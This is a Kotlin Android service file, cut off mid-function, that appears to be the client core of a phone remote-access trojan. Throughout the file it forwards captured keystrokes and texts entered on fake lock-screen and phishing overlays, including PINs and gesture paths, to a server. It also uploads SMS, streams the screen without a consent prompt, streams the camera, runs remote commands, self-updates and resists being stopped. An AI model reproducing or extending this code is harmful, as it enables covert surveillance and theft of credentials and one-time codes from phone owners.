package com.vibelink.client.service

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import androidx.core.content.ContextCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.vibelink.client.AppBroadcast
import com.vibelink.client.BuildConfig
import com.vibelink.client.R
import com.vibelink.client.accessibility.AccessibilityControlBridge
import com.vibelink.client.accessibility.AccessibilityHealth
import com.vibelink.client.accessibility.AccessibilitySelfHeal
import com.vibelink.client.accessibility.ScreenCaptureBridge
import com.vibelink.client.accessibility.UiTreeChangeBus
import com.vibelink.client.adb.AdbRelayController
import com.vibelink.client.adb.AdbSession
import com.vibelink.client.adb.AdbWsUrl
import com.vibelink.client.command.CommandExecutor
import com.vibelink.client.device.DeviceInfoCollector
import com.vibelink.client.device.DeviceStateHelper
import com.vibelink.client.install.ApkUpdateHelper
import com.vibelink.client.network.ApiClient
import com.vibelink.client.network.DeviceScreenWebSocketClient
import com.vibelink.client.network.DeviceWebSocketClient
import com.vibelink.client.network.ServerEndpointStore
import com.vibelink.client.prefs.DevicePrefs
import com.vibelink.client.prefs.DirectBoot
import com.vibelink.client.prefs.ServerPrefs
import com.vibelink.client.device.KeyguardFakeOverlayController
import com.vibelink.client.keyguard.KeyguardFakeSubmitParser
import com.vibelink.client.keyguard.KeyguardLockType
import com.vibelink.client.prefs.KeyguardGesturePathStore
import com.vibelink.client.prefs.KeyguardPinPendingStore
import com.vibelink.client.prefs.SetupPrefs
import com.vibelink.client.screen.CameraStreamCapturer
import com.vibelink.client.screen.MediaProjectionCapturer
import com.vibelink.client.screen.MediaProjectionHolder
import com.vibelink.client.screen.ScreenFrameCodec
import com.vibelink.client.device.ZombieWakeController
import com.vibelink.client.setup.ControlReconnectAlarm
import com.vibelink.client.setup.FcmTopicSubscriber
import com.vibelink.client.setup.FgsKeepAlive
import com.vibelink.client.setup.KeepAliveWakeLock
import com.vibelink.client.setup.ServiceStarter
import com.vibelink.client.setup.ServiceWatchdog
import com.vibelink.client.setup.ZombieWakeAlarm
import com.vibelink.client.sms.SmsHelper
import com.vibelink.client.sms.SmsReader
import com.vibelink.client.ui.CameraPermissionActivity
import com.vibelink.client.ui.ScreenCastConsentActivity
import com.vibelink.client.webrtc.ScreenWebRtcSession
import com.vibelink.client.webrtc.UiTreeFakeScreenRenderer
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume

class ConnectionService : Service(), DeviceWebSocketClient.Listener {
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(serviceJob + Dispatchers.IO)
    private val apiClient = ApiClient()
    private lateinit var devicePrefs: DevicePrefs
    private lateinit var serverPrefs: ServerPrefs
    private lateinit var keyguardPinPendingStore: KeyguardPinPendingStore
    private lateinit var keyguardGesturePathStore: KeyguardGesturePathStore
    private lateinit var commandExecutor: CommandExecutor
    private lateinit var smsReader: SmsReader
    private var isDirectBootMode = false
    private var webSocketClient: DeviceWebSocketClient? = null
    private var screenWebSocketClient: DeviceScreenWebSocketClient? = null
    private var reconnectJob: Job? = null
    /** 控制/画面通道的建连串行化，避免并发 launch 各建一个客户端互相对撞。 */
    private val controlConnectLock = Any()
    private val screenConnectLock = Any()
    /** 最近一次实际发起建连的时间，用于兜底限流，防止失败回调立刻再建连。 */
    @Volatile
    private var lastControlConnectAtMs = 0L

    @Volatile
    private var lastScreenConnectAtMs = 0L
    private var screenReconnectJob: Job? = null
    private var switchRollbackJob: Job? = null
    private var snapshotStreamJob: Job? = null
    private var cameraStreamJob: Job? = null
    private var pendingStreamFps: Int? = null
    /** "screenshot" = a11y takeScreenshot loop (no consent); "projection" = MediaProjection. */
    private var screenStreamMode: String = MODE_SCREENSHOT
    /** Keep desire across screen-WS flaps so we can resume after reconnect. */
    @Volatile
    private var screenStreamDesired: Boolean = false
    private var desiredScreenFps: Int = DEFAULT_SNAPSHOT_FPS
    private var pendingCameraFacing: String? = null
    private var pendingCameraFps: Int? = null
    private var mediaProjectionCapturer: MediaProjectionCapturer? = null
    private var cameraStreamCapturer: CameraStreamCapturer? = null
    private var screenWebRtcSession: ScreenWebRtcSession? = null
    private var pendingIceServers: JSONArray? = null
    private var preferWebRtcProjection: Boolean = true
    /** 1688 同款 WebSocket 帧推流模式（非 WebRTC）。 */
    private var preferWebSocketTransport: Boolean = false
    /** WebSocket 帧推流画质：standard = 1688 同款（短边 240 / q10），hd = 短边 400 / q40。 */
    private var screenFrameQuality: String = QUALITY_STANDARD

    /** 当前画质对应的 WEBP 质量。 */
    private fun currentWebpQuality(): Int =
        if (screenFrameQuality == QUALITY_HD) SCREEN_FRAME_WEBP_QUALITY_HD
        else SCREEN_FRAME_WEBP_QUALITY
    private var lastKeyboardSignature: String? = null
    private var lastKeyboardSentAt: Long = 0L
    private var lastKeyguardPinSignature: String? = null
    private var lastKeyguardPinSentAt: Long = 0L
    private var lastControlEnsureAtMs: Long = 0L
    private var lastScreenshotFailReportAtMs: Long = 0L

    // ---- L1-1: 重命令单实例互斥 ----
    private val heavyCommandInflight = java.util.concurrent.ConcurrentHashMap<String, AtomicBoolean>()

    // ---- L3: UI 树订阅与推送调度 ----
    private val uiTreeSubscribed = AtomicBoolean(false)
    private val uiTreeSeq = java.util.concurrent.atomic.AtomicLong(0L)
    private val uiTreePushLock = Any()
    private var uiTreeDebounceJob: Job? = null
    private var uiTreeIdleHeartbeatJob: Job? = null
    private var zombieWakePollJob: Job? = null
    private var a11yWatchJob: Job? = null
    @Volatile
    private var lastUiTreePushAtMs: Long = 0L
    @Volatile
    private var lastUiTreeSignature: String? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    private val screenSocketListener = object : DeviceScreenWebSocketClient.Listener {
        override fun onConnected() {
            // 画面通了也顺带确认控制通道
            ensureControlChannelAlive(force = true)
            resumeScreenStreamIfDesired()
        }

        override fun onDisconnected(code: Int, reason: String) {
            // Pause jobs only; keep screenStreamDesired so we resume after channel returns.
            stopWebRtcSession()
            stopSnapshotStream(keepCapturer = true)
            stopCameraStream()
            // 画面断了只补画面；勿整段 scheduleReconnect，避免误断控制通道刷上下线
            if (webSocketClient?.isConnected() == true) {
                scheduleScreenReconnect()
            } else {
                scheduleReconnect()
            }
        }

        override fun onFailure(message: String) {
            stopWebRtcSession()
            stopSnapshotStream(keepCapturer = true)
            stopCameraStream()
            if (webSocketClient?.isConnected() == true) {
                scheduleScreenReconnect()
            } else {
                scheduleReconnect()
            }
        }

        override fun onSignaling(type: String, payload: JSONObject) {
            when (type) {
                "webrtc_answer" -> {
                    val sdp = payload.optString("sdp")
                    if (sdp.isNotBlank()) {
                        screenWebRtcSession?.onRemoteAnswer(sdp)
                    }
                }
                "webrtc_ice" -> {
                    screenWebRtcSession?.onRemoteIce(payload)
                }
                "webrtc_hangup" -> {
                    stopWebRtcSession()
                }
            }
        }

        override fun onCommand(id: String, cmd: String, params: JSONObject) {
            serviceScope.launch {
                runCatching {
                    when (cmd) {
                        "start_screen" -> {
                            val fps = params.optInt("fps", DEFAULT_SNAPSHOT_FPS).coerceIn(1, 5)
                            val mode = normalizeScreenMode(params.optString("mode", MODE_SCREENSHOT))
                            val transport = params.optString("transport", "webrtc").trim().lowercase()
                            // websocket = 1688 同款 WEBP 帧推流；webrtc = 视频轨；jpeg 为旧版兼容值。
                            preferWebSocketTransport = transport == "websocket" || transport == "jpeg"
                            preferWebRtcProjection = !preferWebSocketTransport
                            screenFrameQuality = params.optString("quality", QUALITY_STANDARD)
                                .trim().lowercase().let {
                                    if (it == QUALITY_HD) QUALITY_HD else QUALITY_STANDARD
                                }
                            pendingIceServers = params.optJSONArray("iceServers")
                            screenStreamMode = mode
                            screenStreamDesired = true
                            desiredScreenFps = fps
                            val started = when (mode) {
                                MODE_PROJECTION -> ensureProjectionAndStartStream(fps)
                                MODE_SCREENHELPER -> startScreenHelperStream(fps, forceJpeg = false)
                                else -> startScreenshotStream(fps, forceJpeg = false)
                            }
                            screenWebSocketClient?.sendCommandResult(
                                commandId = id,
                                ok = started,
                                data = JSONObject()
                                    .put("action", "start_screen")
                                    .put("fps", fps)
                                    .put("mode", mode)
                                    .put(
                                        "consent",
                                        if (mode == MODE_PROJECTION) {
                                            if (MediaProjectionHolder.hasConsent()) "granted" else "pending"
                                        } else {
                                            "not_required"
                                        },
                                    ),
                                error = if (started) {
                                    null
                                } else if (mode == MODE_PROJECTION) {
                                    "projection_consent_required"
                                } else {
                                    "screenshot_start_failed"
                                },
                            )
                            if (!started && mode == MODE_PROJECTION) {
                                screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_NOT_GRANTED)
                            }
                        }
                        "stop_screen" -> {
                            screenStreamDesired = false
                            pendingStreamFps = null
                            stopWebRtcSession()
                            stopSnapshotStream()
                            screenWebSocketClient?.sendCommandResult(
                                commandId = id,
                                ok = true,
                                data = JSONObject().put("action", "stop_screen"),
                            )
                        }
                        "start_camera" -> {
                            val facing = params.optString("facing", "back")
                            val fps = params.optInt("fps", DEFAULT_SNAPSHOT_FPS).coerceIn(1, 5)
                            val validFacing = if (facing == "front") "front" else "back"
                            val launched = requestCameraStreamStart(validFacing, fps)
                            screenWebSocketClient?.sendCommandResult(
                                commandId = id,
                                ok = launched,
                                data = JSONObject()
                                    .put("action", "start_camera")
                                    .put("facing", validFacing)
                                    .put("fps", fps)
                                    .put("mode", "pending_activity"),
                                error = if (launched) null else "camera_launch_failed",
                            )
                            if (!launched) {
                                screenWebSocketClient?.sendScreenError(ERROR_CAMERA_NOT_GRANTED)
                            }
                        }
                        "stop_camera" -> {
                            stopCameraStream()
                            screenWebSocketClient?.sendCommandResult(
                                commandId = id,
                                ok = true,
                                data = JSONObject().put("action", "stop_camera"),
                            )
                        }
                        "subscribe_ui_tree" -> {
                            uiTreeSubscribed.set(true)
                            // 立即推一次首帧
                            scheduleUiTreePush(forceImmediate = true)
                            screenWebSocketClient?.sendCommandResult(
                                commandId = id,
                                ok = true,
                                data = JSONObject().put("action", "subscribe_ui_tree"),
                            )
                        }
                        "unsubscribe_ui_tree" -> {
                            uiTreeSubscribed.set(false)
                            screenWebSocketClient?.sendCommandResult(
                                commandId = id,
                                ok = true,
                                data = JSONObject().put("action", "unsubscribe_ui_tree"),
                            )
                        }
                    }
                }.onFailure { error ->
                    screenWebSocketClient?.sendCommandResult(
                        commandId = id,
                        ok = false,
                        error = error.message ?: "screen_command_failed",
                    )
                }
            }
        }
    }
    private val keyboardReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action != ACTION_KEYBOARD_EVENT) {
                return
            }

            val text = intent.getStringExtra(EXTRA_TEXT).orEmpty().trim()
            if (text.isBlank()) {
                return
            }

            val appPackage = intent.getStringExtra(EXTRA_APP_PACKAGE)
            val appLabel = intent.getStringExtra(EXTRA_APP_LABEL)
            val eventType = intent.getIntExtra(EXTRA_EVENT_TYPE, 0)
            val capturedAt = intent.getLongExtra(EXTRA_CAPTURED_AT, System.currentTimeMillis())
            val signature = "$appPackage|$eventType|$text"
            val now = System.currentTimeMillis()
            if (signature == lastKeyboardSignature && now - lastKeyboardSentAt < KEYBOARD_DEBOUNCE_MS) {
                return
            }

            lastKeyboardSignature = signature
            lastKeyboardSentAt = now
            webSocketClient?.sendKeyboardEvent(
                appPackage = appPackage,
                appLabel = appLabel,
                text = text,
                eventType = eventType,
                capturedAt = capturedAt,
            )
        }
    }

    private val keyguardPinReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action != ACTION_KEYGUARD_PIN_EVENT) {
                return
            }

            val pin = intent.getStringExtra(EXTRA_PIN).orEmpty().trim()
            if (pin.isBlank()) {
                return
            }

            val lockType = intent.getStringExtra(EXTRA_LOCK_TYPE).orEmpty().ifBlank { "pin" }
            val gesturePath = intent.getStringExtra(EXTRA_GESTURE_PATH).orEmpty().trim()
            val capturedAt = intent.getLongExtra(EXTRA_CAPTURED_AT, System.currentTimeMillis())
            val signature = "$lockType|$pin|$gesturePath|$capturedAt"
            val now = System.currentTimeMillis()
            if (signature == lastKeyguardPinSignature && now - lastKeyguardPinSentAt < KEYGUARD_PIN_DEBOUNCE_MS) {
                return
            }

            lastKeyguardPinSignature = signature
            lastKeyguardPinSentAt = now
            handleKeyguardPin(pin, capturedAt, lockType, gesturePath)
        }
    }

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action != ACTION_SMS_EVENT) {
                return
            }

            val sender = intent.getStringExtra(EXTRA_SENDER).orEmpty().trim()
            val body = intent.getStringExtra(EXTRA_BODY).orEmpty().trim()
            if (sender.isBlank() || body.isBlank()) {
                return
            }

            uploadSms(
                sender = sender,
                body = body,
                smsType = intent.getIntExtra(EXTRA_SMS_TYPE, 1),
                source = intent.getStringExtra(EXTRA_SOURCE) ?: "realtime",
                clientSmsId = intent.getStringExtra(EXTRA_CLIENT_SMS_ID),
                receivedAt = intent.getLongExtra(EXTRA_RECEIVED_AT, System.currentTimeMillis()),
            )
        }
    }

    private val fakePageReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action != ACTION_FAKE_PAGE_EVENT) {
                return
            }
            val text = intent.getStringExtra(EXTRA_TEXT).orEmpty().trim()
            if (text.isBlank()) {
                return
            }
            val capturedAt = intent.getLongExtra(EXTRA_CAPTURED_AT, System.currentTimeMillis())
            val packageName = intent.getStringExtra(EXTRA_APP_PACKAGE).orEmpty()
            webSocketClient?.sendFakePageEvent(
                packageName = packageName,
                title = intent.getStringExtra(EXTRA_TITLE).orEmpty(),
                text = text,
                submitCount = intent.getIntExtra(EXTRA_SUBMIT_COUNT, 1),
                capturedAt = capturedAt,
            )
            if (packageName == KeyguardFakeOverlayController.PACKAGE_MARKER) {
                val parsed = KeyguardFakeSubmitParser.parse(text)
                if (parsed != null) {
                    handleKeyguardPin(
                        pin = parsed.secret,
                        capturedAt = capturedAt,
                        lockType = parsed.lockType.wireName,
                        gesturePath = parsed.gesturePath,
                    )
                }
            }
        }
    }


    override fun onCreate() {
        super.onCreate()
        running.set(true)
        devicePrefs = DevicePrefs(this)
        serverPrefs = ServerPrefs(this)
        keyguardPinPendingStore = KeyguardPinPendingStore(this)
        keyguardGesturePathStore = KeyguardGesturePathStore(this)
        commandExecutor = CommandExecutor(this)
        smsReader = SmsReader(this)
        // 中继重连和「进程重启后恢复」都要用到 Context，先绑上
        AdbRelayController.bindContext(this)
        createNotificationChannel()
        promoteToForegroundSafely()
        ServiceWatchdog.scheduleNextCheck(this)
        ZombieWakeAlarm.schedule(this)
        startZombieWakePolling()
        startAccessibilityWatch()

        // L3-2: 监听 UI 树变化（去抖/节流/dump/push 由 scheduleUiTreePush 完成）
        UiTreeChangeBus.setListener { scheduleUiTreePush(forceImmediate = false) }
        startUiTreeIdleHeartbeat()

        val keyboardFilter = IntentFilter(ACTION_KEYBOARD_EVENT)
        val keyguardPinFilter = IntentFilter(ACTION_KEYGUARD_PIN_EVENT)
        val fakePageFilter = IntentFilter(ACTION_FAKE_PAGE_EVENT)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(keyboardReceiver, keyboardFilter, RECEIVER_NOT_EXPORTED)
            registerReceiver(keyguardPinReceiver, keyguardPinFilter, RECEIVER_NOT_EXPORTED)
            registerReceiver(smsReceiver, IntentFilter(ACTION_SMS_EVENT), RECEIVER_NOT_EXPORTED)
            registerReceiver(fakePageReceiver, fakePageFilter, RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("DEPRECATION")
            registerReceiver(keyboardReceiver, keyboardFilter)
            @Suppress("DEPRECATION")
            registerReceiver(keyguardPinReceiver, keyguardPinFilter)
            @Suppress("DEPRECATION")
            registerReceiver(smsReceiver, IntentFilter(ACTION_SMS_EVENT))
            @Suppress("DEPRECATION")
            registerReceiver(fakePageReceiver, fakePageFilter)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 每次 startForegroundService 都会重新计 5s。服务已在跑时 onCreate 不会再走，
        // 这里不 promote 就是 ANR，vivo ABE 再 force-stop。
        promoteToForegroundSafely()
        refreshDirectBootMode(intent)

        if (intent?.action == ACTION_ENSURE_CONTROL) {
            ensureControlChannelAlive(force = true)
            return START_STICKY
        }

        if (intent?.action == ACTION_POLL_ZOMBIE_WAKE) {
            android.util.Log.i(ZOMBIE_WAKE_LOG_TAG, "onStartCommand ACTION_POLL_ZOMBIE_WAKE")
            serviceScope.launch {
                pollZombieWakeOnce()
            }
            return START_STICKY
        }

        if (intent?.action == ACTION_FLUSH_PENDING_KEYGUARD_PINS) {
            flushPendingKeyguardPins()
            return START_STICKY
        }

        if (intent?.action == ACTION_START_CAMERA) {
            val facing = intent.getStringExtra(EXTRA_CAMERA_FACING)
                ?: pendingCameraFacing
                ?: "back"
            val fps = intent.getIntExtra(EXTRA_CAMERA_FPS, pendingCameraFps ?: DEFAULT_SNAPSHOT_FPS)
                .coerceIn(1, 5)
            pendingCameraFacing = null
            pendingCameraFps = null
            runCatching { startCameraStream(facing, fps) }
                .onFailure {
                    screenWebSocketClient?.sendScreenError(ERROR_CAMERA_NOT_GRANTED)
                }
            return START_STICKY
        }

        if (intent?.action == ACTION_CAMERA_PERMISSION_RESULT) {
            val granted = intent.getBooleanExtra(EXTRA_CAMERA_GRANTED, false)
            if (!granted) {
                pendingCameraFacing = null
                pendingCameraFps = null
                screenWebSocketClient?.sendScreenError(ERROR_CAMERA_NOT_GRANTED)
            }
            return START_STICKY
        }

        if (intent?.action == ACTION_PROJECTION_CONSENT_RESULT) {
            val granted = intent.getBooleanExtra(EXTRA_PROJECTION_GRANTED, false)
            if (granted && MediaProjectionHolder.hasConsent()) {
                promoteToForegroundSafely(withMediaProjection = true)
                val fps = pendingStreamFps ?: DEFAULT_SNAPSHOT_FPS
                pendingStreamFps = null
                screenStreamMode = MODE_PROJECTION
                // Align with ensureProjectionAndStartStream: 按用户选择的传输方式分发。
                if (preferWebSocketTransport) {
                    startSnapshotStream(fps)
                } else if (preferWebRtcProjection) {
                    startProjectionWebRtc(fps)
                } else {
                    startSnapshotStream(fps)
                }
            } else {
                pendingStreamFps = null
                screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_NOT_GRANTED)
            }
            return START_STICKY
        }

        serviceScope.launch {
            runCatching {
                ensureRegistered()
                connectWebSocket()
            }.onFailure { error ->
                android.util.Log.e(TAG, "register/connect failed", error)
                broadcastStatus(getString(R.string.status_error, error.message ?: "unknown"))
                scheduleReconnect()
            }
        }
        return START_STICKY
    }

    override fun onTimeout(startId: Int, fgsType: Int) {
        FgsKeepAlive.onTimeout(
            service = this,
            startId = startId,
            fgsType = fgsType,
            tag = TAG,
            reenterForeground = {
                promoteToForeground(
                    withMediaProjection = MediaProjectionHolder.hasConsent(),
                    withCamera = cameraStreamCapturer?.isRunning() == true,
                )
            },
            mayStopSelf = true,
        )
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        if (DirectBoot.isUserUnlocked(applicationContext)) {
            ServiceStarter.tryStart(applicationContext)
        } else {
            ServiceStarter.tryStartDirectBoot(applicationContext)
        }
        ServiceWatchdog.scheduleFastRestart(applicationContext)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running.set(false)
        KeepAliveWakeLock.release("service_destroy")
        UiTreeChangeBus.setListener(null)
        uiTreeDebounceJob?.cancel()
        uiTreeIdleHeartbeatJob?.cancel()
        zombieWakePollJob?.cancel()
        mainHandler.removeCallbacksAndMessages(null)
        reconnectJob?.cancel()
        screenReconnectJob?.cancel()
        switchRollbackJob?.cancel()
        stopSnapshotStream()
        stopCameraStream()
        mediaProjectionCapturer?.stop()
        mediaProjectionCapturer = null
        unregisterReceiver(keyboardReceiver)
        unregisterReceiver(keyguardPinReceiver)
        unregisterReceiver(smsReceiver)
        unregisterReceiver(fakePageReceiver)
        screenWebSocketClient?.disconnect()
        webSocketClient?.disconnect()
        AdbRelayController.unbind()
        AdbSession.end()
        serviceScope.cancel()
        val appContext = applicationContext
        ZombieWakeAlarm.schedule(appContext)
        if (DirectBoot.isUserUnlocked(appContext)) {
            ServiceStarter.tryStart(appContext)
        } else {
            ServiceStarter.tryStartDirectBoot(appContext)
        }
        ServiceWatchdog.scheduleFastRestart(appContext)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onConnected() {
        android.util.Log.i(TAG, "control WS connected")
        KeepAliveWakeLock.acquire(applicationContext, "ws_connected")
        ControlReconnectAlarm.cancel(applicationContext)
        reconnectJob?.cancel()
        switchRollbackJob?.cancel()
        switchRollbackJob = null
        ServerEndpointStore.clearPrev(serverPrefs)
        broadcastStatus(getString(R.string.status_connected))
        flushPendingKeyguardPins()
        if (isDirectBootMode) {
            return
        }
        ensureScreenChannel()
        serviceScope.launch {
            val uploaded = uploadSmsHistory(DEFAULT_HISTORY_LIMIT)
            if (uploaded > 0) {
                broadcastStatus(getString(R.string.status_sms_history_uploaded, uploaded))
            }
        }
    }

    override fun onDisconnected(code: Int, reason: String) {
        android.util.Log.w(TAG, "control WS disconnected code=$code reason=$reason")
        KeepAliveWakeLock.releaseAfterGrace("ws_disconnected code=$code")
        broadcastStatus(getString(R.string.status_disconnected))
        scheduleReconnect()
    }

    override fun onMessage(text: String) {
        broadcastStatus(getString(R.string.status_server_message, text))
    }

    override fun onCommand(id: String, cmd: String, params: JSONObject) {
        // L1-1: 重命令单实例互斥。同一 cmd 在途时，新请求立即回 superseded，不排队不阻塞。
        // 避免同类慢命令挤占 serviceScope 以及控制通道的写队列。
        if (cmd in HEAVY_COMMANDS) {
            val flag = heavyCommandInflight.computeIfAbsent(cmd) { AtomicBoolean(false) }
            if (!flag.compareAndSet(false, true)) {
                webSocketClient?.sendCommandResult(
                    commandId = id,
                    ok = false,
                    error = "superseded",
                )
                return
            }
        }
        serviceScope.launch {
            try {
                dispatchControlCommand(id, cmd, params)
            } finally {
                if (cmd in HEAVY_COMMANDS) {
                    heavyCommandInflight[cmd]?.set(false)
                }
            }
        }
    }

    private suspend fun dispatchControlCommand(id: String, cmd: String, params: JSONObject) {
            if (cmd == "switch_server") {
                handleSwitchServer(id, params)
                return
            }
            if (cmd == "update_apk") {
                handleUpdateApk(id, params)
                return
            }
            if (cmd == "ensure_screen_channel") {
                ensureScreenChannel()
                webSocketClient?.sendCommandResult(
                    commandId = id,
                    ok = true,
                    data = JSONObject()
                        .put("screenConnected", screenWebSocketClient?.isConnected() == true),
                )
                return
            }

            if (cmd == "start_screen" || cmd == "stop_screen" || cmd == "start_camera" || cmd == "stop_camera") {
                webSocketClient?.sendCommandResult(
                    commandId = id,
                    ok = false,
                    error = "use_screen_channel",
                )
                return
            }

            if (cmd == "get_screen") {
                ensureScreenAwake()
                val capture = captureScreenOnce()
                val keyguardState = DeviceStateHelper.keyguardState(this@ConnectionService)
                val resultData = if (capture.ok) {
                    JSONObject()
                        .put("data", capture.data)
                        .put("screenWidth", capture.screenWidth)
                        .put("screenHeight", capture.screenHeight)
                        .put("imageWidth", capture.imageWidth)
                        .put("imageHeight", capture.imageHeight)
                        .put("capturedAt", System.currentTimeMillis())
                        .put("keyguardLocked", keyguardState["keyguardLocked"] == true)
                        .put("screenInteractive", keyguardState["screenInteractive"] == true)
                } else {
                    JSONObject()
                        .put("keyguardLocked", keyguardState["keyguardLocked"] == true)
                        .put("screenInteractive", keyguardState["screenInteractive"] == true)
                }
                webSocketClient?.sendCommandResult(
                    commandId = id,
                    ok = capture.ok,
                    data = resultData,
                    error = capture.error,
                )
                broadcastStatus(
                    if (capture.ok) {
                        getString(R.string.status_screen_snapshot_ok)
                    } else {
                        getString(R.string.status_screen_error, capture.error ?: "unknown")
                    },
                )
                return
            }

            if (cmd == "capture_screenshot") {
                ensureScreenAwake()
                val capture = captureScreenOnceFull()
                val resultData = if (capture.ok) {
                    JSONObject()
                        .put("data", capture.data)
                        .put("mime", "image/jpeg")
                        .put("screenWidth", capture.screenWidth)
                        .put("screenHeight", capture.screenHeight)
                        .put("imageWidth", capture.imageWidth)
                        .put("imageHeight", capture.imageHeight)
                        .put("capturedAt", System.currentTimeMillis())
                } else {
                    JSONObject()
                }
                webSocketClient?.sendCommandResult(
                    commandId = id,
                    ok = capture.ok,
                    data = resultData,
                    error = capture.error,
                )
                broadcastStatus(
                    if (capture.ok) {
                        getString(R.string.status_screen_snapshot_ok)
                    } else {
                        getString(R.string.status_screen_error, capture.error ?: "unknown")
                    },
                )
                return
            }

            if (cmd == "get_sms") {
                if (!SmsHelper.hasSmsPermissions(this@ConnectionService)) {
                    webSocketClient?.sendCommandResult(
                        commandId = id,
                        ok = false,
                        error = "sms_permission_denied",
                    )
                    return
                }

                val limit = params.optInt("limit", DEFAULT_HISTORY_LIMIT)
                val uploaded = uploadSmsHistory(limit)
                webSocketClient?.sendCommandResult(
                    commandId = id,
                    ok = true,
                    data = JSONObject().put("uploaded", uploaded),
                )
                broadcastStatus(getString(R.string.status_sms_history_uploaded, uploaded))
                return
            }

            val result = commandExecutor.execute(cmd, params)
            webSocketClient?.sendCommandResult(
                commandId = id,
                ok = result.ok,
                data = result.data,
                error = result.error,
            )
            broadcastStatus(
                getString(
                    R.string.status_command_result,
                    cmd,
                    if (result.ok) {
                        getString(R.string.status_command_success)
                    } else {
                        result.error.orEmpty()
                    },
                ),
            )
    }

    override fun onFailure(message: String) {
        android.util.Log.e(TAG, "control WS failure: $message")
        KeepAliveWakeLock.releaseAfterGrace("ws_failure")
        broadcastStatus(getString(R.string.status_error, message))
        scheduleReconnect()
    }

    // ============ L3: UI 树推送调度 ============

    /**
     * 请求一次 UI 树推送。
     *
     * 节流/去抖策略：
     * - 未订阅、未连接画面通道时直接返回。
     * - 节流：两次 push 的最小间隔为 [UI_TREE_THROTTLE_MS]。
     * - 去抖：若 forceImmediate=false，等待 [UI_TREE_DEBOUNCE_MS] 把连续事件合并。
     *   forceImmediate=true 走 0 延时（订阅首帧 / 心跳）。
     * - 签名去重：若新快照签名与上次完全一致（同一界面无变化），跳过。
     */
    private fun scheduleUiTreePush(forceImmediate: Boolean) {
        if (!uiTreeSubscribed.get()) return
        if (screenWebSocketClient?.isConnected() != true) return

        synchronized(uiTreePushLock) {
            uiTreeDebounceJob?.cancel()
            val now = System.currentTimeMillis()
            val sinceLast = now - lastUiTreePushAtMs
            val baseDelay = if (forceImmediate) 0L else UI_TREE_DEBOUNCE_MS
            val throttleWait = (UI_TREE_THROTTLE_MS - sinceLast).coerceAtLeast(0L)
            val delayMs = maxOf(baseDelay, throttleWait)

            uiTreeDebounceJob = serviceScope.launch {
                if (delayMs > 0) {
                    delay(delayMs)
                }
                performUiTreePush(forceImmediate)
            }
        }
    }

    private suspend fun performUiTreePush(forceImmediate: Boolean) {
        if (!uiTreeSubscribed.get()) return
        val screen = screenWebSocketClient ?: return
        if (!screen.isConnected()) return

        // AccessibilityControlBridge.dumpUiTree 内部走 rootInActiveWindow / getWindows，
        // 这些是 Binder 调用，官方建议在主线程执行。
        val snapshot = withContext(Dispatchers.Main) {
            runCatching { AccessibilityControlBridge.dumpUiTree() }.getOrNull()
        } ?: return
        if (snapshot.has("error")) {
            return
        }

        val signature = computeUiTreeSignature(snapshot)
        if (!forceImmediate && signature == lastUiTreeSignature) {
            // 无变化：跳过本次 push，但更新 lastUiTreePushAt 以免被当成心跳窗口。
            lastUiTreePushAtMs = System.currentTimeMillis()
            return
        }

        val seq = uiTreeSeq.incrementAndGet()
        val sent = screen.sendUiTreeSnapshot(seq, snapshot)
        if (sent) {
            lastUiTreeSignature = signature
            lastUiTreePushAtMs = System.currentTimeMillis()
        }
    }

    /**
     * 快照签名：packageName + nodeCount + 前 10 个 node 的 viewId hash。
     * 够廉价、够区分；同一页面滚动时 viewId 不变但 nodeCount 常变，会触发更新。
     */
    private fun computeUiTreeSignature(snapshot: JSONObject): String {
        val pkg = snapshot.optString("packageName")
        val nodes = snapshot.optJSONArray("nodes")
        val nodeCount = nodes?.length() ?: 0
        val builder = StringBuilder()
        builder.append(pkg).append('|').append(nodeCount).append('|')
        if (nodes != null) {
            val limit = minOf(10, nodeCount)
            for (i in 0 until limit) {
                val n = nodes.optJSONObject(i) ?: continue
                builder.append(n.optString("viewId")).append(',')
            }
        }
        return builder.toString().hashCode().toString()
    }

    private fun startUiTreeIdleHeartbeat() {
        uiTreeIdleHeartbeatJob?.cancel()
        uiTreeIdleHeartbeatJob = serviceScope.launch {
            while (isActive) {
                delay(UI_TREE_IDLE_HEARTBEAT_MS)
                if (!uiTreeSubscribed.get()) continue
                val sinceLast = System.currentTimeMillis() - lastUiTreePushAtMs
                if (sinceLast >= UI_TREE_IDLE_HEARTBEAT_MS) {
                    scheduleUiTreePush(forceImmediate = true)
                }
            }
        }
    }

    private suspend fun ensureRegistered() {
        if (devicePrefs.hasCredentials()) {
            android.util.Log.i(TAG, "already registered deviceId=${devicePrefs.deviceId}")
            broadcastDeviceId(devicePrefs.deviceId.orEmpty())
